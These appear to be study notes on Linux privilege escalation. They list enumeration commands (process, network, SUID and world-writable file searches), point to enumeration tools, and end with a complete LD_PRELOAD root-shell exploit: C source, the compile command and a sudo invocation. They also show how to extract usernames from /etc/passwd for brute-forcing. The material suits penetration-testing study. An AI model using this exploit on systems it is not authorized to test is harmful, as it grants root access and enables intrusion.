# Linux PrivEsc

> Shahrukh Tramboo | February 7th, 2022

--------------------------------------

**Enumeration**

Commands:
1.	hostname

2.	uname -a

3.	/proc/version
Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

4.	/etc/issue
Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changed.

5.	ps Command
The “ps” command provides a few useful options.
	```bash
	ps -A
	``` 
	View all running processes
	
	```bash
	ps axjf 
	```
	View process tree
	
	```bash
	ps aux 
	```
	The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x).

6.	env

7.	sudo -l

8.	ls

9.	id

10.	/etc/passwd
While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.

```bash
cat /etc/passwd | cut -d ":" -f 1
```

11.	history

12.	ifconfig
Our attacking machine can reach the eth0 interface but can not directly access the two other networks.
This can be confirmed using the 
```bash
ip route
```
command to see which network routes exist.

13.	netstat
The netstat command can be used with several different options to gather information on existing connections.
	```bash
	netstat -a
	```
	shows all listening ports and established connections.
	
	```bash
	netstat -at
	``` 
	or 
	```bash
	netstat -au 
	```
	can also be used to list TCP or UDP protocols respectively.
	
	```bash
	netstat -l
	```
	list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol
	
	```bash
	netstat -s
	```
	list network usage statistics by protocol.This can also be used with the -t or -u options to limit the output to a specific protocol.

	```bash
	netstat -tp
	```
	list connections with the service name and PID information.
	This can also be used with the -l option to list listening ports
	We can see the “PID/Program name” column is empty as this process is owned by another user. Run the same command with root privileges

	```bash
	netstat -i
	```
	 Shows interface statistics. Which are more active?


	The netstat usage you will probably see most often in blog posts, write-ups, and courses is
	```bash
	netstat -ano
	```
	-a: Display all sockets
	-n: Do not resolve names
	-o: Display timers

14.	find Command
	```bash
	find . -name flag1.txt
	```
	find the file named “flag1.txt” in the current directory


	```bash
	find / -type d -name config
	```
	find the directory named config under “/”


	```bash
	find / -type f -perm 0777
	```
	find files with the 777 permissions


	```bash
	find / -perm a=x
	```
	find executable files


	```bash
	find /home -user frank
	```

	```bash
	find / -mtime 10
	```
	find files that were modified in the last 10 days

	```bash
	find / -atime 10
	```
	find files that were accessed in the last 10 day

	```bash
	find / -cmin -60
	```
	find files changed within the last hour (60 minutes)

	```bash
	find / -amin -60
	```

	```bash
	find / -size 50M
	```
	or

	```bash
	find / -size +50M
	```

 	“find” command tends to generate errors which sometimes makes the output hard to read
	```bash
	2>/dev/null
	```

	Folders and files that can be written to or executed from:
	```bash
	find / -writable -type d 2>/dev/null
	```
	Find world-writeable folders

	```bash
	find / -perm -222 -type d 2>/dev/null
	```
	Find world-writeable folders

	```bash
	find / -perm -o w -type d 2>/dev/null
	```
	Find world-writeable folders

	```bash
	find / -perm -o x -type d 2>/dev/null
	```
	Find world-executable folders

	```bash
	find / -name perl*
	find / -name python*
	find / -name gcc*
	```
	Find development tools and supported languages

	```bash
	find / -perm -u=s -type f 2>/dev/null
	```
	Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

------------------------------------------------------------------

**Automated Enumeration Tools**

LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

LinEnum: https://github.com/rebootuser/LinEnum

LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester

Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration

Linux Priv Checker: https://github.com/linted/linuxprivchecker	

------------------------------------------------------------------

**Privilege Escalation: Kernel Exploits**

Sources such as https://www.linuxkernelcves.com/cves can also be useful.

Another alternative would be to use a script like 
```bash
LES (Linux Exploit Suggester)
```
but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. 

---------------------------------------------------------------

**Privilege Escalation: Sudo**

https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

Leverage LD_PRELOAD:
LD_PRELOAD is a function that allows any program to use shared libraries.
This blog post will give you an idea about the capabilities of LD_PRELOAD.
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

The steps of this privilege escalation vector can be summarized as follows;

1.	Check for LD_PRELOAD (with the env_keep option)
2.	Write a simple C code compiled as a share object (.so extension) file
3.	Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file


The C code will simply spawn a root shell and can be written as follows;
```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}	
```

then save it as shared library
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

then run
```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
--------------------------------------------------------------
